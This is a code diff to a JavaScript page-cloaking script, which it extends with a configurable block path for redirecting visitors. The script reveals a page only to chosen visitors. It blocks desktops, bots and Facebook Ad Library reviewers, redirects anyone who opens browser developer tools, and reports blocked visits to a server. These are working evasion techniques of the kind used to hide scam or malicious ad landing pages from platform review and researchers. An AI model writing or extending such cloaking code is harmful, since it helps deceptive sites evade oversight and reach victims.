@@ -24,6 +24,7 @@
     
     // Defaults if /api/config fails
     REDIRECT_URL: 'https://www.google.com/',
+    BLOCK_PATH: null,
     BLOCK_DESKTOP: true,
     BLOCK_FACEBOOK_LIBRARY: true,
     BLOCK_BOTS: true,
@@ -34,6 +35,11 @@
   };
 
   let serverConfig = null;
+
+  function getBlockTarget() {
+    if (CONFIG.BLOCK_PATH) return CONFIG.SERVER_URL.replace(/\/$/, '') + CONFIG.BLOCK_PATH;
+    return CONFIG.REDIRECT_URL;
+  }
 
   // Reveal page when allowed
   function showPage() {
@@ -50,6 +56,7 @@
       if (res.ok) {
         serverConfig = await res.json();
         CONFIG.REDIRECT_URL = serverConfig.redirect_url || CONFIG.REDIRECT_URL;
+        CONFIG.BLOCK_PATH = serverConfig.block_path || null;
         CONFIG.BLOCK_DESKTOP = !!serverConfig.block_desktop;
         CONFIG.BLOCK_FACEBOOK_LIBRARY = !!serverConfig.block_facebook_library;
         CONFIG.BLOCK_BOTS = !!serverConfig.block_bots;
@@ -268,7 +275,7 @@
         (e.metaKey && e.altKey && ['i','c','j'].includes(e.key.toLowerCase()))
       ) {
         e.preventDefault();
-        window.location.replace(CONFIG.REDIRECT_URL);
+        window.location.replace(getBlockTarget());
       }
     });
 
@@ -282,7 +289,7 @@
       const heightDiff = window.outerHeight - window.innerHeight > 160;
       if ((widthDiff || heightDiff) && !devToolsOpen) {
         devToolsOpen = true;
-        window.location.replace(CONFIG.REDIRECT_URL);
+        window.location.replace(getBlockTarget());
       } else if (!widthDiff && !heightDiff) {
         devToolsOpen = false;
       }
@@ -358,7 +365,7 @@
     var syncCheck = shouldBlockSync();
     if (syncCheck.block) {
       sendBlockedVisitSync(syncCheck.reason);
-      window.location.replace(CONFIG.REDIRECT_URL);
+      window.location.replace(getBlockTarget());
       return;
     }
 
@@ -416,7 +423,7 @@
     await sendTrackingData(data);
 
     if (blockCheck.block) {
-      window.location.replace(CONFIG.REDIRECT_URL);
+      window.location.replace(getBlockTarget());
       return;
     }
 
